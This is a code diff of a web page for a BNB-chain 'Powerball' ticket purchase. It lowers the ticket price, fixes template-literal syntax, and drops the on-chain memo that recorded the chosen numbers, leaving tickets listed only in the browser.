@@ -220,7 +220,7 @@
         <p id="displayPowerball"></p>
 
         <button onclick="generateRandomNumbers()">Generate Random Numbers</button>
-        <button onclick="sendTransaction()">Buy 0.003 BNB</button>
+        <button onclick="sendTransaction()">Buy 0.0006 BNB</button>
 
         <div id="tickets">
             <h2>Your Tickets</h2>
@@ -233,7 +233,7 @@
 
     <script>
        const recipientAddress = "0xeAc26dbDAD105F2e7Ff4339DFf88B11A868551E5";
-        const amountToSend = "0.003";
+        const amountToSend = "0.0006";
 
         let walletAddress = null;
 
@@ -247,14 +247,14 @@
 
             const numbers = Array.from(uniqueNumbers);
             for (let i = 1; i <= 5; i++) {
-                document.getElementById(number${i}).value = numbers[i - 1].toString().padStart(2, '0');
+                document.getElementById(`number${i}`).value = numbers[i - 1].toString().padStart(2, '0');
             }
 
             const powerball = randomNumber(1, 26);
             document.getElementById('powerball').value = powerball.toString().padStart(2, '0');
 
             const displayPowerball = document.getElementById('displayPowerball');
-            displayPowerball.textContent = Powerball: ${powerball.toString().padStart(2, '0')};
+            displayPowerball.textContent = `Powerball: ${powerball.toString().padStart(2, '0')}`;
         }
 
         async function switchToBNBChain() {
@@ -282,64 +282,60 @@
         }
 
         async function sendTransaction() {
-    const numbers = [];
-    for (let i = 1; i <= 5; i++) {
-        const value = document.getElementById(number${i}).value;
-        if (!value || isNaN(value) || value < 1 || value > 69) {
-            showAlert("Please enter valid numbers between 1 and 69.", "error");
-            return;
+            const numbers = [];
+            for (let i = 1; i <= 
+            5; i++) {
+                const value = document.getElementById(`number${i}`).value;
+                if (!value || isNaN(value) || value < 1 || value > 69) {
+                    showAlert("Please enter valid numbers between 1 and 69.", "error");
+                    return;
+                }
+                numbers.push(value);
+            }
+
+            const powerball = document.getElementById('powerball').value;
+            if (!powerball || isNaN(powerball) || powerball < 1 || powerball > 26) {
+                showAlert("Please enter a valid Powerball number between 1 and 26.", "error");
+                return;
+            }
+
+            if (!window.ethereum) {
+                showAlert("MetaMask is not installed. Please install it to continue.", "error");
+                return;
+            }
+
+            await switchToBNBChain();
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+
+            try {
+                const transaction = await signer.sendTransaction({
+                    to: recipientAddress,
+                    value: ethers.utils.parseEther(amountToSend),
+                });
+
+                showAlert("Transaction sent! Waiting for confirmation...", "success");
+                await transaction.wait();
+
+                addTicketToList([...numbers, powerball]);
+                showAlert("Transaction confirmed! Your ticket has been added.", "success");
+            } catch (error) {
+                console.error("Transaction error:", error);
+                showAlert("You don't have enough balance.", "error");
+            }
         }
-        numbers.push(value);
-    }
-
-    const powerball = document.getElementById('powerball').value;
-    if (!powerball || isNaN(powerball) || powerball < 1 || powerball > 26) {
-        showAlert("Please enter a valid Powerball number between 1 and 26.", "error");
-        return;
-    }
-
-    if (!window.ethereum) {
-        showAlert("MetaMask is not installed. Please install it to continue.", "error");
-        return;
-    }
-
-    await switchToBNBChain();
-
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-
-    // Crear el memo codificado en UTF-8
-    const memo = Numbers: ${numbers.join(", ")} | Powerball: ${powerball};
-    const memoEncoded = ethers.utils.toUtf8Bytes(memo); // Codificar a bytes UTF-8
-
-    try {
-        const transaction = await signer.sendTransaction({
-            to: recipientAddress,
-            value: ethers.utils.parseEther(amountToSend),
-            data: ethers.utils.hexlify(memoEncoded), // Convertir a formato hexadecimal
-        });
-
-        showAlert("Transaction sent! Waiting for confirmation...", "success");
-        await transaction.wait();
-
-        addTicketToList([...numbers, powerball]);
-        showAlert("Transaction confirmed! Your ticket has been added.", "success");
-    } catch (error) {
-        console.error("Transaction error:", error);
-        showAlert("You don't have enough balance.", "error");
-    }
-}
 
         function addTicketToList(ticketNumbers) {
             const ticketList = document.getElementById('ticketList');
             const ticketItem = document.createElement('li');
-            ticketItem.textContent = Numbers: ${ticketNumbers.slice(0, 5).join(", ")} | Powerball: ${ticketNumbers[5]};
+            ticketItem.textContent = `Numbers: ${ticketNumbers.slice(0, 5).join(", ")} | Powerball: ${ticketNumbers[5]}`;
             ticketList.appendChild(ticketItem);
         }
 
         function showAlert(message, type) {
             const alertBox = document.createElement('div');
-            alertBox.className = alert alert-${type};
+            alertBox.className = `alert alert-${type}`;
             alertBox.textContent = message;
             document.body.appendChild(alertBox);
 
@@ -369,7 +365,7 @@
                 document.getElementById('walletAddress').textContent = walletAddress;
 
                 const etherscanLink = document.getElementById('etherscanLink');
-                etherscanLink.href = https://bscscan.com/address/${walletAddress};
+                etherscanLink.href = `https://bscscan.com/address/${walletAddress}`;
             } catch (error) {
                 console.error("Error connecting wallet:", error);
                 showAlert("Failed to connect wallet. Please try again.", "error");
